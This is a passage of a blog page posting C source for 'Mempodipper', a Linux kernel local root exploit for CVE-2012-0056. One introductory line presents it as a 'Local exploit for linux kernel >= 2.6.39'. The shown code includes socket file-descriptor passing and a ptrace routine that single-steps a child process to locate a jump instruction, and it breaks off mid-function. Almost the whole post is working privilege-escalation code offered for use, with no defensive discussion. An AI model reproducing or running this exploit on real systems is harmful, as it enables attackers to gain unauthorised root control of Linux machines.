<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>@xjump</title>

      

      
          <script src="/slideout/1.0.1/slideout.min.js"></script>
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">

          <script defer src="/katex/0.10.1/katex.min.js" ></script>
          <script defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>
              
          <script defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
              
          
      

      
          <link rel="stylesheet" href="https:&#x2F;&#x2F;xjump.me&#x2F;site.css">
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >
          
      

      
      
    </head>

    <body>
        <div class="container">

            <div id="mobile-navbar" class="mobile-navbar">
              <div class="mobile-header-logo">
                <a href="/" class="logo">@xjump</a>
              </div>
              <div class="mobile-navbar-icon icon-out">
                <span></span>
                <span></span>
                <span></span>
              </div>
            </div>

            <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
              <ul class="mobile-menu-list">
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me">
                            Home
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">
                            Categories
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">
                            Archive
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
                            RSS
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">
                            About
                        </a>
                    </li>
                
              </ul>
            </nav>

            <header id="header">
                <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
                <nav class="menu">
                    <ul>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me">
                                    Home
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">
                                    Categories
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">
                                    Archive
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
                                    RSS
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">
                                    About
                                </a>
                            </li>
                        
                    </ul>
                </nav>
            </header>

            <main>
                <div class="content" id="mobile-panel">
                    



<article class="post">
    
    <header class="post__header">
        <h1 class="post__title">
            <a href="https:&#x2F;&#x2F;xjump.me&#x2F;local-exploit-cve2012-0056&#x2F;">CVE-2012-0056</a>
        </h1>
        <div class="post__meta">
            <span class="post__time">2013-01-06</span>
            
        </div>
    </header>

    <div class="post-content">
      <p>
  Local exploit for linux kernel >= 2.6.39, x64 and x86.
</p>
<span id="continue-reading"></span>
<pre style="background-color:#212121;">
<code class="language-cpp" data-lang="cpp"><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
 * Mempodipper</span><span style="font-style:italic;color:#4a4a4a;">
 * by zx2c4</span><span style="font-style:italic;color:#4a4a4a;">
 * </span><span style="font-style:italic;color:#4a4a4a;">
 * Linux Local Root Exploit</span><span style="font-style:italic;color:#4a4a4a;">
 * </span><span style="font-style:italic;color:#4a4a4a;">
 * Rather than put my write up here, per usual, this time I&#39;ve put it</span><span style="font-style:italic;color:#4a4a4a;">
 * in a rather lengthy blog post: http://blog.zx2c4.com/749</span><span style="font-style:italic;color:#4a4a4a;">
 * </span><span style="font-style:italic;color:#4a4a4a;">
 * Enjoy.</span><span style="font-style:italic;color:#4a4a4a;">
 * </span><span style="font-style:italic;color:#4a4a4a;">
 * - zx2c4</span><span style="font-style:italic;color:#4a4a4a;">
 * Jan 21, 2012</span><span style="font-style:italic;color:#4a4a4a;">
 * </span><span style="font-style:italic;color:#4a4a4a;">
 * CVE-2012-0056</span><span style="font-style:italic;color:#4a4a4a;">
 */</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">_LARGEFILE64_SOURCE</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">_GNU_SOURCE</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdio.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">string.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdlib.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/types.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/stat.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/socket.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/un.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/wait.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/types.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/user.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/ptrace.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/reg.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">fcntl.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">unistd.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">limits.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">prog_name</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">send_fd</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">sock</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">fd</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> iovec iov</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> msghdr msg</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> cmsghdr </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">cmsg</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> n</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> cms</span><span style="color:#89ddff;">[</span><span style="color:#82aaff;">CMSG_SPACE</span><span style="color:#89ddff;">(sizeof(</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#89ddff;">))];</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  buf</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">] = </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  iov</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">iov_base </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  iov</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">iov_len </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">msg</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof</span><span style="color:#82aaff;"> msg</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iov </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">iov</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iovlen </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_control </span><span style="color:#89ddff;">= (</span><span style="color:#ffcb6b;">caddr_t</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">cms</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_controllen </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">CMSG_LEN</span><span style="color:#89ddff;">(sizeof(</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  cmsg </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">CMSG_FIRSTHDR</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">msg</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  cmsg</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">cmsg_len </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">CMSG_LEN</span><span style="color:#89ddff;">(sizeof(</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  cmsg</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">cmsg_level </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> SOL_SOCKET</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  cmsg</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">cmsg_type </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> SCM_RIGHTS</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memmove</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">CMSG_DATA</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">cmsg</span><span style="color:#89ddff;">), &amp;</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">, sizeof(</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">n </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">sendmsg</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sock</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">msg</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">)) !=</span><span style="color:#eeffff;"> iov</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">iov_len</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#89ddff;">-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">close</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sock</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">recv_fd</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">sock</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> n</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> fd</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> iovec iov</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> msghdr msg</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> cmsghdr </span><span style="color:#89ddff;">*</span><span style="color:#eeffff;">cmsg</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> cms</span><span style="color:#89ddff;">[</span><span style="color:#82aaff;">CMSG_SPACE</span><span style="color:#89ddff;">(sizeof(</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#89ddff;">))];</span><span style="color:#eeffff;">
  </span><span style="color:#eeffff;">
  iov</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">iov_base </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  iov</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">iov_len </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">msg</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof</span><span style="color:#82aaff;"> msg</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_name </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_namelen </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iov </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">iov</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iovlen </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_control </span><span style="color:#89ddff;">= (</span><span style="color:#ffcb6b;">caddr_t</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">cms</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msg</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_controllen </span><span style="color:#89ddff;">= sizeof</span><span style="color:#eeffff;"> cms</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">n </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">recvmsg</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sock</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">msg</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">)) &lt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#89ddff;">-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">n </span><span style="color:#89ddff;">== </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#89ddff;">-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  cmsg </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">CMSG_FIRSTHDR</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">msg</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memmove</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">, </span><span style="color:#82aaff;">CMSG_DATA</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">cmsg</span><span style="color:#89ddff;">), sizeof(</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">close</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sock</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return</span><span style="color:#eeffff;"> fd</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">unsigned long </span><span style="color:#82aaff;">ptrace_address</span><span style="color:#89ddff;">()</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> fd</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">2</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Creating ptrace pipe.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">pipe</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">fcntl</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">],</span><span style="color:#82aaff;"> F_SETFL</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> O_NONBLOCK</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Forking ptrace child.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> child </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">fork</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">child</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">close</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">]);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Waiting for ptraced child to give output on syscalls.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(;;) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">wait</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">read</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">fd</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">], &amp;</span><span style="color:#82aaff;">buf</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) &gt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
        </span><span style="font-style:italic;color:#c792ea;">break</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">ptrace</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">PTRACE_SYSCALL</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> child</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Error message written. Single stepping to find address.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> user_regs_struct regs</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(;;) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">ptrace</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">PTRACE_SINGLESTEP</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> child</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">wait</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">ptrace</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">PTRACE_GETREGS</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> child</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">regs</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#if defined</span><span style="color:#eeffff;">(__i386__)</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">instruction_pointer regs</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">eip</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">upper_bound </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">b0000000</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#elif defined</span><span style="color:#eeffff;">(__x86_64__)</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">instruction_pointer regs</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">rip</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">upper_bound </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">700000000000</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#else</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#error </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">That platform is not supported.</span><span style="color:#89ddff;">&quot;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#endif</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">instruction_pointer </span><span style="color:#89ddff;">&lt;</span><span style="color:#eeffff;"> upper_bound</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
        </span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> instruction </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">ptrace</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">PTRACE_PEEKTEXT</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> child</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> instruction_pointer</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
        </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">instruction </span><span style="color:#89ddff;">&amp; 0x</span><span style="color:#f78c6c;">ffff</span><span style="color:#89ddff;">) == 0x</span><span style="color:#f78c6c;">25ff </span><span style="font-style:italic;color:#4a4a4a;">/* jmp r/m32 */</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
          </span><span style="font-style:italic;color:#c792ea;">return</span><span style="color:#eeffff;"> instruction_pointer</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
      </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[+] Ptrace_traceme&#39;ing process.</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">ptrace</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">PTRACE_TRACEME</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">) &lt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">[-] ptrace</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
